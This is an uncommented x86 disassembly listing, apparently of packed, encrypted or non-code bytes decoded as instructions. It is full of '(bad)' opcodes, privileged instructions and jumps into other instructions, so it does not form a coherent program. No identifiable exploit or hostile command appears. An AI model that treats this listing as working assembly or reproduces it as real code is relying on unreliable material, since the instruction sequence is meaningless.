  40c94b:	mov    ah,BYTE PTR [esi+0x4]
  40c94e:	or     BYTE PTR [esi+edi*4],dh
  40c951:	cmp    al,0x3b
  40c953:	je     0x40c955
  40c955:	mov    ebp,DWORD PTR [ebx]
  40c957:	mov    edx,0xff8a8dbe
  40c95c:	add    BYTE PTR [edi+0x33],dl
  40c95f:	push   ecx
  40c960:	mov    esi,0x8b4e53
  40c965:	mov    ebx,0x363b45
  40c96a:	pushf  
  40c96b:	sub    edi,DWORD PTR [edx-0x7757a45]
  40c971:	add    BYTE PTR [ebx],bh
  40c973:	xor    esi,DWORD PTR [ebx+edi*4+0x53]
  40c977:	dec    edi
  40c978:	str    ecx
  40c97b:	cmp    esp,DWORD PTR [edx+0x75]
  40c97e:	int    0x89
  40c980:	mov    esi,0x77208fc
  40c985:	xor    edx,DWORD PTR [esi]
  40c987:	mov    eax,DWORD PTR [eax]
  40c989:	xor    esp,DWORD PTR [esi-0x73]
  40c98c:	retf   
  40c98d:	push   edi
  40c98e:	add    esp,ebp
  40c990:	push   ebp
  40c991:	add    BYTE PTR [ebp-0x293cfee8],cl
  40c997:	cmp    dl,0x49
  40c99a:	(bad)  
  40c99b:	sti    
  40c99c:	mov    esi,DWORD PTR [ebp+0x78]
  40c99f:	mov    esp,ebp
  40c9a1:	cld    
  40c9a2:	add    BYTE PTR ds:0xf8008508,bh
  40c9a8:	data16 or al,0xcb
  40c9ab:	rol    DWORD PTR [edx-0x37],0x0
  40c9af:	mov    DWORD PTR [esi+0x47],esp
  40c9b2:	retf   
  40c9b3:	in     eax,0xba
  40c9b5:	add    BYTE PTR [eax],al
  40c9b7:	(bad)  
  40c9b8:	pop    si
  40c9ba:	retf   
  40c9bb:	ret    
  40c9bc:	enter  0x4d8b,0x51
  40c9c0:	pop    edi
  40c9c1:	mov    DWORD PTR [ecx-0x637ac904],0x333574f8
  40c9cb:	pushf  
  40c9cc:	(bad)  
  40c9cd:	call   0x26c81a
  40c9d2:	add    BYTE PTR [ebx+0x3b55bac9],cl
  40c9d8:	in     al,dx
  40c9d9:	add    BYTE PTR [esi+0x2b],dl
  40c9dc:	(bad)  
  40c9dd:	mov    edx,0x858afc
  40c9e2:	clc    
  40c9e3:	xor    esi,DWORD PTR ds:0xe84e9cba
  40c9e9:	add    bh,bh
  40c9eb:	cmp    edi,edi
  40c9ed:	je     0x40c9e7
  40c9ef:	push   ebx
  40c9f0:	pop    es
  40c9f1:	sysexit 
  40c9f3:	leave  
  40c9f4:	dec    ecx
  40c9f5:	bound  edi,QWORD PTR [ebp+ecx*8+0x61]
  40c9f9:	mov    edi,0x76208c7
  40c9fe:	int    0x64
  40ca00:	mov    ecx,0x7660800
  40ca05:	retf   
  40ca06:	add    ax,WORD PTR [eax]
  40ca09:	jne    0x40ca13
  40ca0b:	lea    eax,[eax]
  40ca0d:	add    DWORD PTR [esi-0x9],esp
  40ca10:	ret    
  40ca11:	(bad)  
  40ca12:	inc    edx
  40ca13:	xlat   BYTE PTR ds:[ebx]
  40ca14:	add    BYTE PTR [ebx-0x1a3caf9a],cl
  40ca1a:	add    BYTE PTR fs:[eax],al
  40ca1d:	or     BYTE PTR [esi+0x0],ah
  40ca20:	ret    
  40ca21:	add    cx,bx
  40ca24:	jne    0x40ca68
  40ca26:	lea    eax,[eax]
  40ca28:	add    DWORD PTR [esi-0xf],esp
  40ca2b:	retf   
  40ca2c:	(bad)  
  40ca2d:	mov    edx,0x668400d1
  40ca32:	cmp    al,0xcb
  40ca34:	fs enter 0x7d8a,0x80
  40ca39:	ss xor eax,0x805ff39c
  40ca3f:	je     0x40cabd
  40ca41:	xor    eax,ebx
  40ca43:	inc    eax
  40ca44:	inc    ebp
  40ca45:	add    bl,BYTE PTR [ebx-0x40]
  40ca48:	ss leave 
  40ca4a:	pushf  
  40ca4b:	push   ebp
  40ca4c:	je     0x40ca3a
  40ca4e:	xor    ecx,DWORD PTR [ebx-0x4899f7cd]
  40ca54:	mov    WORD PTR [esi+0x3c],ss
  40ca57:	and    DWORD PTR [esp+eax*8-0x75],0xc9425fff
  40ca5f:	add    BYTE PTR [ebp+0x57],dl
  40ca62:	in     al,dx
  40ca63:	(bad)  
  40ca64:	push   esi
  40ca65:	mov    edx,0x89360045
  40ca6a:	pushf  
  40ca6b:	cld    
  40ca6c:	mov    esi,0xf874853b
  40ca71:	mov    edx,edx
  40ca73:	or     bh,bh
  40ca75:	ret    0x4566
  40ca78:	or     bl,ch
  40ca7a:	or     BYTE PTR [ebx-0x7699f800],cl
  40ca80:	retf   0x4283
  40ca83:	add    al,BYTE PTR [eax]
  40ca85:	mov    bh,0x66
  40ca87:	adc    dl,cl
  40ca89:	iret   
  40ca8a:	mov    edx,0x66c400c7
  40ca8f:	dec    edx
  40ca91:	(bad)  
  40ca92:	push   edi
  40ca93:	mov    edx,0x66b70057
  40ca98:	mov    edx,0xffdf8df8
  40ca9d:	rcl    BYTE PTR [edi+0x66],0x51
  40caa1:	add    bh,BYTE PTR [ebx+0x5e4f45]
  40caa7:	ret    0x3b
  40caaa:	jne    0x40ca37
  40caac:	mov    DWORD PTR [ebx+0x457218fc],eax
  40cab2:	xor    esi,DWORD PTR ds:0xc7339c8b
  40cab8:	callw  0x5048
  40cabc:	cmp    al,0xf8
  40cabe:	fs inc ebp
  40cac0:	mov    ebx,0x83b35
  40cac5:	pop    es
  40cac6:	sub    ebx,DWORD PTR [esi-0x7675cd45]
  40cacc:	add    al,bh
  40cace:	xor    eax,DWORD PTR [ebp-0x45]
  40cad1:	cmp    eax,0xc7009c4e
  40cad6:	cmp    esi,esp
  40cad8:	jne    0x40ca5f
  40cada:	cmp    eax,0x338545fc
  40cae0:	clc    
  40cae1:	pushf  
  40cae2:	pop    ebx
  40cae3:	mov    eax,DWORD PTR ds:0xeb57c0ec
  40cae9:	push   ecx
  40caea:	xor    ecx,DWORD PTR [ebx-0x7b3c07a2]
  40caf0:	mov    ebx,DWORD PTR [esi-0x74bacdaf]
  40caf6:	psubsb mm1,QWORD PTR [eax]
  40caf9:	icebp  
  40cafa:	lea    ecx,[eax]
  40cafc:	clc    
  40cafd:	pop    es
  40cafe:	inc    ecx
  40cb00:	mov    esi,0x8a72
  40cb05:	push   ebp
  40cb06:	xor    ecx,DWORD PTR [edi]
  40cb08:	mov    edi,0xc24ed1
  40cb0d:	adc    DWORD PTR [ebp+0x0],0x66
  40cb11:	add    bh,al
  40cb13:	inc    ebp
  40cb14:	sub    ecx,DWORD PTR [ebx-0x3ed407bb]
  40cb1a:	mov    DWORD PTR [ebp+0x8],ecx
  40cb1d:	add    DWORD PTR [ebx],0x66514557
  40cb23:	or     DWORD PTR [edx],0xf32c29e
  40cb29:	cmp    edi,DWORD PTR [esi+esi*2]
  40cb2c:	mov    ecx,DWORD PTR [ebx+0x45f80881]
  40cb32:	dec    DWORD PTR [ebx+0x4db80c33]
  40cb38:	dec    esi
  40cb39:	mov    eax,DWORD PTR [eax]
  40cb3b:	mov    DWORD PTR [ebx],edi
  40cb3d:	mov    esi,DWORD PTR [ebp+0x4]
  40cb40:	xor    ecx,DWORD PTR [eax+0x5f]
  40cb43:	mov    ecx,DWORD PTR [ecx-0x3a87410]
  40cb49:	push   ecx
  40cb4a:	leave  
  40cb4b:	mov    eax,DWORD PTR [eax+edi*8]
  40cb4e:	push   ebp
  40cb4f:	test   ah,ch
  40cb51:	sahf   
  40cb52:	in     al,dx
  40cb53:	xor    al,bh
  40cb55:	mov    esp,ebp
  40cb57:	clc    
  40cb58:	test   DWORD PTR [ebp-0x74baff08],ebx
  40cb5e:	xor    al,0x10
  40cb60:	pushf  
  40cb61:	dec    ebp
  40cb62:	mov    ebp,DWORD PTR [ebx]
  40cb64:	in     al,dx
  40cb65:	mov    edx,DWORD PTR [edi-0xc]
  40cb68:	push   ecx
  40cb69:	icebp  
  40cb6a:	add    eax,0x77208
  40cb6f:	rol    DWORD PTR [ebp+0x72],0xc7
  40cb73:	add    al,dh
  40cb75:	rol    DWORD PTR [ebp+0x4545f827],0x3
  40cb7c:	xor    eax,edi
  40cb7e:	pushf  
  40cb7f:	dec    ebp
  40cb80:	mov    DWORD PTR [ebx],0x985f8fc
  40cb86:	clc    
  40cb87:	or     BYTE PTR [ebp+0x45],al
  40cb8a:	xor    eax,0x7080835
  40cb8f:	pop    es
  40cb90:	dec    ebp
  40cb91:	dec    ebp
  40cb92:	lea    ecx,[ebp+0x72720101]
  40cb98:	add    BYTE PTR [eax],al
  40cb9a:	dec    ebp
  40cb9b:	inc    ebp
  40cb9c:	sub    ebx,0x10518b57
  40cba2:	or     DWORD PTR [ebp-0x62],0x8b8b322b
  40cba9:	cld    
  40cbaa:	adc    cl,dh
  40cbac:	scas   eax,DWORD PTR es:[edi]
  40cbad:	or     BYTE PTR [ebx],bh
  40cbaf:	pop    es
  40cbb0:	xadd   ebp,ebp
  40cbb3:	jb     0x40cbb5
  40cbb5:	add    BYTE PTR [ebx+0x4d2910c1],cl
  40cbbb:	inc    ebp
  40cbbc:	sub    eax,DWORD PTR [ebx]
  40cbbe:	mov    edi,eax
  40cbc0:	lock dec ebp
  40cbc2:	icebp  
  40cbc3:	add    ecx,DWORD PTR [eax]
  40cbc5:	clc    
  40cbc6:	pop    es
  40cbc7:	mov    eax,ecx
  40cbc9:	data16 jb 0x40cbd4
  40cbcc:	add    BYTE PTR [ebp-0x3f],al
  40cbcf:	xor    eax,0x7450830
  40cbd4:	add    ecx,DWORD PTR [ebp-0x8]
  40cbd7:	lea    ecx,[ebp+0x1]
  40cbda:	add    esi,DWORD PTR [edx-0x8]
  40cbdd:	add    BYTE PTR [ecx],dl
  40cbdf:	inc    ebp
  40cbe0:	adc    bl,ch
  40cbe2:	dec    ecx
  40cbe3:	mov    ecx,DWORD PTR [ecx+0x45450408]
  40cbe9:	mov    esi,DWORD PTR ds:0x74d080c
  40cbef:	mov    cl,BYTE PTR [ebp-0x78]
  40cbf2:	lea    ecx,[ebx-0x768d07ff]
  40cbf8:	add    al,bh
  40cbfa:	inc    ebp
  40cbfb:	in     al,0xe9
  40cbfd:	inc    DWORD PTR [eax]
  40cbff:	leave  
  40cc00:	add    BYTE PTR [eax*2-0x71374ab],cl
  40cc07:	push   ecx
  40cc08:	rol    DWORD PTR [ebp+0x4d],0x35
  40cc0c:	sbb    DWORD PTR [edi+edx*2-0x7e07ae39],0x32f89e85
  40cc17:	sar    BYTE PTR [ebx],0x74
  40cc1a:	jbe    0x40cba7
  40cc1c:	mov    edi,esp
  40cc1e:	or     BYTE PTR [edi+0x45],dl
  40cc21:	push   ecx
  40cc22:	mov    eax,DWORD PTR ds:0x4d720c
  40cc28:	mov    eax,DWORD PTR [ebp-0x77]
  40cc2b:	jne    0x40cbb8
  40cc2d:	jmp    0x40cc23
  40cc2f:	mov    edx,DWORD PTR [edi-0x8]
  40cc32:	push   ecx
  40cc33:	push   edi
  40cc34:	mov    edx,DWORD PTR [ecx-0x8]
  40cc37:	add    eax,0x9e7284
  40cc3c:	xor    cl,BYTE PTR [ebp-0x77]
  40cc3f:	sub    edi,eax
  40cc41:	mov    DWORD PTR [ebx+0xc],ebx
  40cc44:	inc    ebp
  40cc45:	inc    ebp
  40cc46:	mov    esi,DWORD PTR ds:0x7c108f8
  40cc4c:	dec    ebp
  40cc4d:	sahf   
  40cc4e:	xor    DWORD PTR [edx],0x8518b57
  40cc54:	or     DWORD PTR [ebp-0x62],0x3beb3288
  40cc5b:	leave  
  40cc5c:	jbe    0x40cc66
  40cc5e:	mov    edx,DWORD PTR [ebp+0x8]
  40cc61:	in     al,dx
  40cc62:	inc    ebp
  40cc63:	in     al,dx
  40cc64:	mov    eax,DWORD PTR [edx]
  40cc66:	or     al,0x0
  40cc68:	dec    ebp
  40cc69:	inc    ebp
  40cc6a:	xor    ax,0x9c09
  40cc6e:	mov    edi,eax
  40cc70:	mov    esi,eax
  40cc72:	cld    
  40cc73:	test   DWORD PTR [edi-0x8],edx
  40cc76:	push   ecx
  40cc77:	inc    ebp
  40cc78:	mov    ecx,DWORD PTR [ebx-0x3f7bf708]
  40cc7e:	sahf   
  40cc7f:	pop    es
  40cc80:	xor    al,al
  40cc82:	mov    DWORD PTR [ebp-0x74e8ff08],esp
  40cc88:	inc    ebp
  40cc89:	or     al,0x3
  40cc8b:	sar    al,0xf2
  40cc8e:	dec    ebp
  40cc8f:	lea    eax,[ebx]
  40cc91:	in     al,0xf8
  40cc93:	dec    DWORD PTR [ecx]
  40cc95:	mov    DWORD PTR [eax],ecx
  40cc97:	cld    
  40cc98:	inc    ebp
  40cc99:	inc    ebp
  40cc9a:	inc    eax
  40cc9b:	mov    DWORD PTR [ebp-0x14],eax
  40cc9e:	jmp    0xff97cae8
  40cca3:	mov    edi,0x70008c2
  40cca8:	mov    eax,edi
  40ccaa:	push   ecx
  40ccab:	sahf   
  40ccac:	(bad)  
  40ccad:	xor    bh,ah
  40ccaf:	add    eax,DWORD PTR [ebp+0x4510f889]
  40ccb5:	inc    ebp
  40ccb6:	xor    al,0xe8
  40ccb8:	pushf  
  40ccb9:	std    
  40ccba:	xor    edi,edi
  40ccbc:	inc    eax
  40ccbd:	fadd   DWORD PTR [eax+0x45]
  40ccc0:	inc    ebp
  40ccc1:	mov    esi,DWORD PTR ds:0x7510814
  40ccc7:	inc    ebp
  40ccc8:	sahf   
  40ccc9:	xor    DWORD PTR [edx],0x8
  40cccc:	cmp    DWORD PTR [ebp+0xc],eax
  40cccf:	mov    eax,DWORD PTR [edx]
  40ccd1:	clc    
  40ccd2:	sub    al,0x40
  40ccd4:	inc    ebp
  40ccd5:	call   0xff49c80f
  40ccda:	pop    es
  40ccdb:	inc    ebp
  40ccdc:	sahf   
  40ccdd:	push   DWORD PTR [edx]
  40ccdf:	adc    BYTE PTR [ebx-0x3717f3ab],cl
  40cce5:	std    
  40cce6:	dec    ebp
  40cce7:	dec    DWORD PTR [ebx+0x5708fcdb]
  40cced:	inc    ebp
  40ccee:	push   ecx
  40ccef:	call   0xffb3c8f9
  40ccf4:	add    BYTE PTR [ebp+0x4d],al
  40ccf7:	xor    eax,DWORD PTR [ebx]
  40ccf9:	add    ecx,DWORD PTR [eax+edx*2]
  40ccfc:	add    DWORD PTR [ebp-0x45],esi
  40ccff:	inc    edx
  40cd01:	cld    
  40cd02:	add    BYTE PTR [ecx],dh
  40cd04:	mov    edi,edi
  40cd06:	or     DWORD PTR [ebx-0x30ff0be4],0xc1f4cec7
  40cd10:	test   DWORD PTR [esi],ebx
  40cd12:	clc    
  40cd13:	inc    ebp
  40cd14:	inc    ebp
  40cd15:	mov    esi,DWORD PTR [ecx+ecx*4]
  40cd18:	pushf  
  40cd19:	or     al,0x8b
  40cd1b:	inc    ebp
  40cd1c:	adc    BYTE PTR [ebx-0x3f7af3bb],cl
  40cd22:	jne    0x40cd5f
  40cd24:	xor    esi,DWORD PTR [ebp-0x17]
  40cd27:	xor    eax,DWORD PTR [eax]
  40cd29:	pop    edi
  40cd2a:	add    BYTE PTR [ebx+0x45],bl
  40cd2d:	ret    0x85
  40cd30:	je     0x40cd77
  40cd32:	push   ebx
  40cd33:	mov    eax,DWORD PTR [ebp-0xe02e8]
  40cd39:	mov    eax,DWORD PTR [ebp-0x75]
  40cd3c:	mov    ecx,DWORD PTR [esp+ecx*1]
  40cd3f:	in     al,dx
  40cd40:	inc    ebp
  40cd41:	or     DWORD PTR [ebx+0x5753f408],0x57
  40cd48:	push   edi
  40cd49:	test   BYTE PTR [ecx+0x0],dl
  40cd4c:	xor    eax,DWORD PTR [eax]
  40cd4e:	mov    esi,0x8472c0
  40cd53:	add    dh,al
  40cd55:	add    BYTE PTR [ebp-0x49],al
  40cd58:	mov    esp,DWORD PTR [eax]
  40cd5a:	or     al,0xc8
  40cd5c:	add    BYTE PTR [ebp-0x1],al
  40cd5f:	xor    ecx,DWORD PTR [ebx+0x8f88b21]
  40cd65:	inc    edx
  40cd66:	inc    eax
  40cd67:	add    bl,ch
  40cd69:	xor    ecx,DWORD PTR [ebx-0x17f7f37f]
  40cd6f:	add    BYTE PTR [ecx+0x45f4f889],cl
  40cd75:	mov    eax,DWORD PTR gs:[eax]
  40cd78:	sub    cl,cl
  40cd7a:	retf   0xff7e
  40cd7d:	mov    WORD PTR [ebp+0x10],cx
  40cd81:	jae    0x40cdf8
  40cd83:	lea    ecx,[ebx+0x63fffcf8]
  40cd89:	xor    edi,edi
  40cd8b:	jne    0x8bcc42de
  40cd91:	or     al,0xfc
  40cd93:	or     al,0x3e
  40cd95:	push   WORD PTR [ecx-0x75]
  40cd99:	jne    0x40cd8b
  40cd9b:	cmpxchg8b QWORD PTR [ecx]
  40cd9e:	(bad)  
  40cd9f:	mov    edx,0x66ec00ff
  40cda4:	jne    0x40cd75
  40cda6:	call   0xff9ec6b7
  40cdab:	cmovge edi,edx
  40cdae:	xor    edi,DWORD PTR [ebx+eax*1]
  40cdb1:	add    BYTE PTR [ebx],bh
  40cdb3:	sub    eax,0xf8b5d74
  40cdb8:	or     al,0xfa
  40cdba:	add    BYTE PTR [edi],cl
  40cdbc:	inc    ebp
  40cdbd:	cmp    al,0x8b
  40cdbf:	mov    ebx,0x4d3b08
  40cdc4:	sub    DWORD PTR [ebx],0x14
  40cdc7:	enterw 0x9ff8,0x3b
  40cdcc:	shl    BYTE PTR [esi+ebx*2+0x6a],0xc9
  40cdd1:	pop    edi
  40cdd2:	or     al,0x45
  40cdd4:	mov    esp,DWORD PTR [esi-0x8]
  40cdd7:	dec    ebp
  40cdd8:	inc    eax
  40cdd9:	data16 jmp 0x40ce29
  40cddc:	push   ebp
  40cddd:	jb     0x40cdcb
  40cddf:	jmp    0x40ce26
  40cde1:	inc    DWORD PTR [ebx+0x7d7f10f8]
  40cde7:	mov    eax,DWORD PTR [eax]
  40cde9:	or     BYTE PTR [esi-0x49],dl
  40cdec:	jo     0x7440ffa1
  40cdf2:	test   DWORD PTR [edx+0xf],eax
  40cdf5:	jmp    DWORD PTR [edi+0xf77000f]
  40cdfb:	inc    DWORD PTR [eax+0x33]
  40cdfe:	mov    ebx,DWORD PTR [edi-0x77]
  40ce01:	pop    ebx
  40ce02:	lock ret 0xd2
  40ce06:	push   ebp
  40ce07:	dec    ebp
  40ce08:	mov    eax,0xf88a81
  40ce0d:	dec    eax
  40ce0f:	ror    ax,0x3b
  40ce13:	rol    BYTE PTR [eax],0x3b
  40ce16:	dec    ebp
  40ce17:	lock adc DWORD PTR [esp+edi*8+0x6a5533eb],0xffffffec
  40ce20:	pop    edi
  40ce21:	in     al,dx
  40ce22:	cmp    edx,DWORD PTR [edi-0xc]
  40ce25:	clc    
  40ce26:	xchg   DWORD PTR fs:[edx-0xff3bff],esi
  40ce2d:	cmp    al,dh
  40ce2f:	jne    0x40cde8
  40ce31:	xor    edi,esp
  40ce33:	jmp    0xcdcf95
  40ce38:	mov    ebp,DWORD PTR [ecx+edi*1]
  40ce3b:	jne    0x40ce3f
  40ce3d:	call   0xfff8cb79
  40ce42:	mov    edi,0x14e97
  40ce47:	add    BYTE PTR [ebx],bh
  40ce49:	inc    edi
  40ce4a:	jne    0x40cdd5
  40ce4c:	mov    esi,DWORD PTR [eax+ecx*1-0x7f7648b9]
  40ce53:	mov    eax,0x8974471f
  40ce58:	mov    edi,DWORD PTR [eax+ecx*1+0x6600b787]
  40ce5f:	add    BYTE PTR [esi+0x88d1f45],bh
  40ce65:	stos   BYTE PTR es:[edi],al
  40ce66:	add    BYTE PTR [eax],al
  40ce68:	mov    bx,di
  40ce6b:	les    esi,FWORD PTR [ebx]
  40ce6d:	xchg   DWORD PTR [esi+0x0],esp
  40ce70:	iret   
  40ce71:	add    BYTE PTR [edx],dl
  40ce73:	inc    ebp
  40ce74:	jl     0x40ce03
  40ce76:	(bad)  
  40ce77:	out    dx,al
  40ce78:	cld    
  40ce79:	add    BYTE PTR [ebx+0x39ccf489],cl
  40ce7f:	xchg   esp,edi
  40ce81:	add    DWORD PTR [eax+eax*1-0x72babafa],ebp
  40ce88:	push   0x32
  40ce8a:	pop    edi
  40ce8b:	add    BYTE PTR [ebp-0x77],dh
  40ce8e:	paddq  mm1,mm2
  40ce91:	xchg   DWORD PTR [ecx+eax*1],edi
  40ce94:	add    BYTE PTR [eax],al
  40ce96:	adc    ecx,DWORD PTR [ecx+0x457cb083]
  40ce9c:	test   eax,ebp
  40ce9e:	inc    DWORD PTR [eax]
  40cea0:	inc    DWORD PTR [eax]
  40cea2:	ror    BYTE PTR [ebx+0xc9a85e],0x8
  40cea9:	dec    DWORD PTR [ebx-0x3e020718]
  40ceaf:	inc    esp
  40ceb1:	inc    ebp
  40ceb2:	inc    DWORD PTR [ebp-0x52ccf0cd]
  40ceb8:	data16 add BYTE PTR [ebp-0x75],cl
  40cebc:	(bad)  
  40cebe:	rcl    BYTE PTR [esi-0x1e],0x74
  40cec2:	mov    edi,DWORD PTR [eax-0x7d]
  40cec5:	lock push eax
  40cec7:	jle    0x40ce54
  40cec9:	mov    ecx,DWORD PTR [ebx+0x56a81c]
  40cecf:	mov    eax,DWORD PTR [ebx+0x7f80018]
  40ced5:	jge    0x40ce97
  40ced7:	mov    esi,DWORD PTR [eax]
  40ced9:	adc    al,0x0
  40cedb:	enter  0xd06a,0xff
  40cedf:	dec    ebp
  40cee0:	or     BYTE PTR [ecx+0x7dffe4c1],cl
  40cee6:	mov    edi,DWORD PTR [ebx]
  40cee8:	lods   al,BYTE PTR ds:[esi]
  40cee9:	ja     0x40ceeb
  40ceeb:	mov    DWORD PTR [ebp+0x45db22f8],ecx
  40cef1:	pop    ebp
  40cef2:	lea    edi,[ecx]
  40cef4:	inc    esp
  40cef5:	clc    
  40cef6:	inc    ebp
  40cef7:	outs   dx,BYTE PTR ds:[esi]
  40cef8:	lea    eax,[ebx]
  40cefa:	push   bp
  40cefc:	inc    ebp
  40cefd:	mov    ecx,DWORD PTR [ebp+0xb788e0]
  40cf03:	pop    edi
  40cf04:	mov    DWORD PTR [esi-0x40],ebx
  40cf07:	jae    0x40ce90
  40cf09:	cmp    eax,DWORD PTR [eax]
  40cf0b:	adc    al,0x0
  40cf0d:	pop    eax
  40cf0e:	inc    ebp
  40cf0f:	sbb    al,0x8d
  40cf11:	mov    ecx,esp
  40cf13:	or     BYTE PTR [eax],al
  40cf15:	cmp    al,0x89
  40cf17:	mov    eax,ecx
  40cf19:	cld    
  40cf1a:	xchg   DWORD PTR [ebp+0x0],edx
  40cf1d:	add    eax,DWORD PTR [eax]
  40cf1f:	add    eax,DWORD PTR [ebp+0x2b]
  40cf22:	lea    ecx,[eax]
  40cf24:	adc    BYTE PTR [ebp+0x0],al
  40cf27:	or     ecx,DWORD PTR [ecx-0x78763000]
  40cf2d:	fadd   QWORD PTR [ecx]
  40cf2f:	push   ebp
  40cf30:	add    BYTE PTR [ebx+0x1b8d0045],al
  40cf36:	push   esp
  40cf37:	inc    ebp
  40cf38:	add    bh,bh
  40cf3a:	push   edi
  40cf3b:	adc    BYTE PTR [ebp-0x18],bh
  40cf3e:	mov    ebp,edi
  40cf40:	fdivr  st,st(7)
  40cf42:	cli    
  40cf43:	dec    ebp
  40cf44:	add    BYTE PTR [ebp-0x74788bb0],al
  40cf4a:	add    esp,edi
  40cf4c:	add    BYTE PTR [eax],bh
  40cf4e:	xor    BYTE PTR [ebp-0x51],al
  40cf51:	cmp    edi,0xfffffffc
  40cf54:	mov    edi,edi
  40cf56:	lock in al,dx
  40cf58:	rcl    ah,0x84
  40cf5b:	pop    ebp
  40cf5c:	add    BYTE PTR [ebx+0x0],al
  40cf5f:	pop    ebp
  40cf60:	dec    eax
  40cf61:	cmp    edx,DWORD PTR [ebx-0x8]
  40cf64:	mov    edx,DWORD PTR [ecx+eax*1-0x7436fca5]
  40cf6b:	add    al,0x24
  40cf6d:	push   ebp
  40cf6e:	dec    esi
  40cf6f:	in     al,dx
  40cf70:	mov    eax,DWORD PTR [ebp+0x20]
  40cf73:	push   esi
  40cf74:	pop    esi
  40cf75:	mov    al,0x3
  40cf77:	add    DWORD PTR [ecx+0x7eb0e000],ecx
  40cf7d:	add    DWORD PTR [ebx],eax
  40cf7f:	add    BYTE PTR [ebx],al
  40cf81:	inc    ebp
  40cf82:	mov    eax,ebp
  40cf84:	hlt    
  40cf85:	(bad)  
  40cf86:	push   ebp
  40cf87:	dec    DWORD PTR [ecx-0x4fe07f2]
  40cf8d:	push   es
  40cf8e:	add    ecx,ecx
  40cf90:	pop    ebp
  40cf91:	or     BYTE PTR [ebx],dh
  40cf93:	jns    0x5e02b85a
  40cf99:	ret    0x76
  40cf9c:	jmp    0x40cf2d
  40cf9e:	mov    eax,DWORD PTR [ecx]
  40cfa0:	in     al,0x0
  40cfa2:	jge    0x40cf8f
  40cfa4:	sysexit 
  40cfa6:	cmp    al,0x8a
  40cfa8:	cmp    eax,DWORD PTR [eax]
  40cfaa:	sbb    BYTE PTR [eax],cl
  40cfac:	pop    ebp
  40cfad:	add    BYTE PTR [esi+0x66],bh
  40cfb0:	jae    0x40cfb3
  40cfb2:	mov    eax,ecx
  40cfb4:	call   0xb9b7:0x8b025583
  40cfbb:	mov    ebx,0x8d4e55
  40cfc0:	mov    al,0x3b
  40cfc2:	fdiv   DWORD PTR [ebp-0x8]
  40cfc5:	xor    edx,DWORD PTR [ebp+0x66]
  40cfc8:	mov    DWORD PTR [ecx],0x10087ec
  40cfce:	add    BYTE PTR [eax],al
  40cfd0:	push   ebp
  40cfd1:	ret    
  40cfd2:	mov    ecx,DWORD PTR [ebx-0x77c57404]
  40cfd8:	jne    0x40cfda
  40cfda:	mov    eax,ecx
  40cfdc:	fadd   QWORD PTR [esi]
  40cfde:	xor    al,0xc7
  40cfe0:	push   ebx
  40cfe1:	or     dh,dh
  40cfe3:	icebp  
  40cfe4:	inc    DWORD PTR [eax+0x8f4358b]
  40cfea:	rol    BYTE PTR [edx+0x5],0xa
  40cfee:	inc    ebp
  40cfef:	stc    
  40cff0:	mov    DWORD PTR [ebp-0x75],esi
  40cff3:	(bad)  
  40cff4:	lock add BYTE PTR [ebp-0x7a],al
  40cff8:	add    al,0x1
  40cffa:	dec    ebp
  40cffb:	add    BYTE PTR [ebp-0x39],dh
  40cffe:	mov    eax,ebx
  40d000:	call   0xe8c45990
  40d005:	sbb    al,0x5d
  40d007:	mov    edi,0xf85e8572
  40d00c:	pop    edi
  40d00d:	jge    0x40cfd1
  40d00f:	lea    eax,[eax]
  40d011:	dec    DWORD PTR [ebx+0x88b8b45]
  40d017:	or     bh,bh
  40d019:	leave  
  40d01a:	fadd   DWORD PTR [eax+eax*1-0x67ff7300]
  40d021:	dec    ebp
  40d022:	add    BYTE PTR [ebp-0xff7f075],al
  40d028:	xchg   ebp,eax
  40d029:	add    bh,bh
  40d02b:	mov    ecx,DWORD PTR [ebx-0x74b276f0]
  40d031:	mov    esi,DWORD PTR [ebx]
  40d033:	or     al,0x39
  40d035:	dec    ebp
  40d036:	pop    esi
  40d037:	mov    edx,DWORD PTR [ebp+0x5d458b08]
  40d03d:	in     al,0x4
  40d03f:	pushf  
  40d040:	mov    ecx,DWORD PTR [ecx-0x76ff1378]
  40d046:	push   ebx
  40d047:	call   0xc83595f
  40d04c:	add    BYTE PTR [ebp+0x5],cl
  40d04f:	(bad)  
  40d050:	cmp    edx,DWORD PTR [eax]
  40d052:	add    BYTE PTR [ebp+0x5783f889],al
  40d058:	add    dl,BYTE PTR [ecx-0x3e]
  40d05b:	mov    ebx,0xff028d0f
  40d060:	mov    edx,0x66330045
  40d065:	mov    eax,ebx
  40d067:	sub    esp,eax
  40d069:	add    eax,eax
  40d06b:	clc    
  40d06c:	mov    DWORD PTR [ebx-0x7477ff75],edx
  40d072:	add    BYTE PTR [ebx+ebx*2],cl
  40d075:	dec    ebp
  40d076:	push   edi
  40d077:	xor    edi,eax
  40d079:	xor    eax,DWORD PTR [esi+0x8018d]
  40d07f:	in     eax,0xe7
  40d081:	add    BYTE PTR [ebx],al
  40d083:	inc    ebp
  40d084:	jmp    0x40d0b9
  40d086:	xor    bh,0x49
  40d089:	mov    ebp,ecx
  40d08b:	adc    BYTE PTR [eax-0x75ccbfb3],cl
  40d091:	xor    eax,DWORD PTR [eax-0x10c483d5]
  40d097:	jne    0x40d099
  40d099:	mov    ecx,DWORD PTR [ebx+0x458808]
  40d09f:	mov    eax,DWORD PTR [ebx]
  40d0a1:	hlt    
  40d0a2:	pop    edi
  40d0a3:	add    BYTE PTR [ebp-0x37],dl
  40d0a6:	in     al,dx
  40d0a7:	push   es
  40d0a8:	in     al,dx
  40d0a9:	dec    ecx
  40d0aa:	push   edi
  40d0ab:	xor    eax,0x4d9c1735
  40d0b0:	mov    DWORD PTR [eax+0x624757e8],eax
  40d0b6:	mov    ecx,edx
  40d0b8:	in     al,0x4d
  40d0ba:	dec    ebp
  40d0bb:	add    BYTE PTR [ebp-0x43df0a9],0xe9
  40d0c2:	add    dl,dl
  40d0c4:	mov    ecx,DWORD PTR [ebx+0x4dc9080c]
  40d0ca:	test   BYTE PTR [eax+0x8008b00],cl
  40d0d0:	dec    ebp
  40d0d1:	push   ebp
  40d0d2:	mov    DWORD PTR [eax+0x4d72f4],edi
  40d0d8:	mov    eax,ecx
  40d0da:	clc    
  40d0db:	into   
  40d0dc:	dec    ebp
  40d0dd:	retf   0x18c7
  40d0e0:	lock dec ebp
  40d0e2:	test   DWORD PTR [ebx-0x31baf308],ecx
  40d0e8:	push   ebx
  40d0e9:	(bad)  
  40d0ea:	jge    0x40d0b6
  40d0ec:	push   esi
  40d0ed:	enter  0xce45,0x89
  40d0f1:	dec    ebp
  40d0f2:	cld    
  40d0f3:	jmp    0xff74d03d
  40d0f8:	pushf  
  40d0f9:	inc    ebp
